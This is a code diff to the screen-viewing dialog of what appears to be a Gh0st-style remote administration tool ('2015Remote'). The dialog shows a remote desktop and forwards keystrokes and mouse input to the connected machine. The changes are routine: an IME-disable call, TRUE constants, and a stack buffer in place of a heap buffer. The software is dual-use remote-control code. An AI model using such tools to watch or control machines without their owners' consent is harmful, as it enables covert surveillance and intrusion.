@@ -5,6 +5,7 @@
 #include "2015Remote.h"
 #include "ScreenSpyDlg.h"
 #include "afxdialogex.h"
+#include <imm.h>
 
 
 // CScreenSpyDlg 对话框
@@ -28,6 +29,7 @@ IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)
 CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
 	: CDialog(CScreenSpyDlg::IDD, Parent)
 {
+	ImmDisableIME(0);// 禁用输入法
 	m_bFullScreen = FALSE;
 
 	m_iocpServer	= IOCPServer;
@@ -415,7 +417,7 @@ BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
 	case WM_SYSKEYDOWN:
 	case WM_SYSKEYUP:
 		if (pMsg->wParam == VK_F11 && LeaveFullScreen()) // F11: 退出全屏
-			return true;
+			return TRUE;
 		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
 		{
 			MSG	Msg;
@@ -426,7 +428,7 @@ BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
 			SendCommand(&Msg);
 		}
 		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
-			return true;// 屏蔽Enter和ESC关闭对话
+			return TRUE;// 屏蔽Enter和ESC关闭对话
 		break;
 	}
 
@@ -439,12 +441,12 @@ VOID CScreenSpyDlg::SendCommand(MSG* Msg)
 	if (!m_bIsCtrl)
 		return;
 
-	LPBYTE szData = new BYTE[sizeof(MSG) + 1];
+	const int length = sizeof(MSG) + 1;
+	BYTE szData[length + 3];
 	szData[0] = COMMAND_SCREEN_CONTROL;
 	memcpy(szData + 1, Msg, sizeof(MSG));
-	m_iocpServer->OnClientPreSending(m_ContextObject, szData, sizeof(MSG) + 1);
-
-	delete[] szData;
+	szData[length] = 0;
+	m_iocpServer->OnClientPreSending(m_ContextObject, szData, length);
 }
 
 BOOL CScreenSpyDlg::SaveSnapshot(void)
